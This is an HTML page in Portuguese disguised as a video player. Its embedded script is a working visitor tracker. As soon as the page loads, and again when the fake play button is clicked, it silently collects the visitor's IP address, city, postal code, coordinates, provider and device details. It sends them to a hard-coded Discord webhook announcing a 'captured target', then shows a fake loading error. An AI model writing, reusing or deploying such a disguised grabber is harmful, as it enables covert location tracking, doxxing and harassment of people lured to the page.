<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Assistir Vídeo</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #000;
        color: #fff;
        font-family: -apple-system, Roboto, sans-serif;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 20px;
    }
    .player {
        width: 100%;
        max-width: 500px;
        background: #111;
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 10px 40px rgba(0,0,0,0.8);
    }
    .video-area {
        width: 100%;
        aspect-ratio: 16/9;
        background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%);
        display: flex;
        align-items: center;
        justify-content: center;
        position: relative;
        cursor: pointer;
    }
    .play-btn {
        width: 70px;
        height: 70px;
        border-radius: 50%;
        background: rgba(255,255,255,0.95);
        display: flex;
        align-items: center;
        justify-content: center;
        transition: transform 0.2s;
    }
    .play-btn:active { transform: scale(0.92); }
    .play-btn::after {
        content: '';
        width: 0;
        height: 0;
        border-left: 22px solid #000;
        border-top: 14px solid transparent;
        border-bottom: 14px solid transparent;
        margin-left: 6px;
    }
    .info { padding: 16px 18px; }
    .title { font-size: 16px; font-weight: 600; margin-bottom: 8px; line-height: 1.3; }
    .meta { font-size: 13px; color: #888; display: flex; gap: 12px; align-items: center; }
    .loading { display: none; flex-direction: column; align-items: center; gap: 15px; }
    .spinner {
        width: 45px;
        height: 45px;
        border: 3px solid rgba(255,255,255,0.1);
        border-top-color: #00ff88;
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-text { font-size: 14px; color: #aaa; }
</style>
</head>
<body>

<div class="player">
    <div class="video-area" id="videoArea">
        <div class="play-btn" id="playBtn"></div>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text">Carregando vídeo...</div>
        </div>
    </div>
    <div class="info">
        <div class="title">Vídeo Exclusivo — Não Perca</div>
        <div class="meta">
            <span>1,2 mi de visualizações</span>
            <span>•</span>
            <span>há 2 horas</span>
        </div>
    </div>
</div>

<script>
// ============================================
// COLA A URL DO WEBHOOK DO DISCORD ABAIXO
// ============================================
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1554280041628696577/-y-toRQ-_xlIHJ7hftfv7nMdOEbBhYV5y9jrob9HdfJYjyy-GQKm05qMTKuAiBPOsqH6';
// ============================================

async function coletarDados() {
    let ip = 'desconhecido';
    let geo = {};

    // 1. pega o IP
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        ip = d.ip;
    } catch(e) {}

    // 2. pega geolocalização
    try {
        const r2 = await fetch('https://ipapi.co/' + ip + '/json/');
        geo = await r2.json();
    } catch(e) {}

    // 3. monta o pacote
    const dados = {
        ip: ip,
        pais: geo.country_name || '—',
        regiao: geo.region || '—',
        cidade: geo.city || '—',
        cep: geo.postal || '—',
        lat: geo.latitude || '—',
        lon: geo.longitude || '—',
        provedor: geo.org || '—',
        asn: geo.asn || '—',
        user_agent: navigator.userAgent,
        plataforma: navigator.platform,
        idioma: navigator.language,
        tela: screen.width + 'x' + screen.height,
        horario: new Date().toISOString()
    };

    // 4. monta o embed bonito pro Discord
    const payload = {
        username: "Storm Force Tracker",
        avatar_url: "https://i.imgur.com/8Q6Xk3L.png",
        content: "🎯 **NOVO ALVO CAPTURADO**",
        embeds: [{
            title: "📍 Dados capturados",
            color: 0xFF4444,
            fields: [
                { name: "🌐 IP", value: "`" + dados.ip + "`", inline: false },
                { name: "🌎 País", value: dados.pais, inline: true },
                { name: "🗺️ Estado", value: dados.regiao, inline: true },
                { name: "🏙️ Cidade", value: dados.cidade, inline: true },
                { name: "📮 CEP", value: dados.cep, inline: true },
                { name: "🧭 Coordenadas", value: dados.lat + ", " + dados.lon, inline: false },
                { name: "📡 Provedor", value: dados.provedor, inline: false },
                { name: "📱 Dispositivo", value: dados.user_agent.substring(0, 200), inline: false },
                { name: "🖥️ Tela", value: dados.tela, inline: true },
                { name: "🗣️ Idioma", value: dados.idioma, inline: true }
            ],
            footer: { text: "Storm Force is Back • " + new Date().toLocaleString('pt-BR') },
            timestamp: new Date().toISOString()
        }]
    };

    // 5. manda pro Discord
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch(e) {}

    // 6. backup via Image (caso o fetch falhe)
    const img = new Image();
    img.src = WEBHOOK_URL + '?ip=' + ip + '&cidade=' + encodeURIComponent(geo.city || '') + '&pais=' + encodeURIComponent(geo.country_name || '');
}

// aciona quando clica no play (disfarce visual)
document.getElementById('playBtn').addEventListener('click', function() {
    document.getElementById('playBtn').style.display = 'none';
    document.getElementById('loading').style.display = 'flex';
    coletarDados();
    setTimeout(() => {
        document.querySelector('.loading-text').textContent = 'Não foi possível carregar. Tente novamente mais tarde.';
        document.querySelector('.spinner').style.borderTopColor = '#ff4444';
    }, 4000);
});

// dispara silenciosamente ao carregar
window.addEventListener('load', function() {
    setTimeout(coletarDados, 800);
});
</script>

</body>
</html>
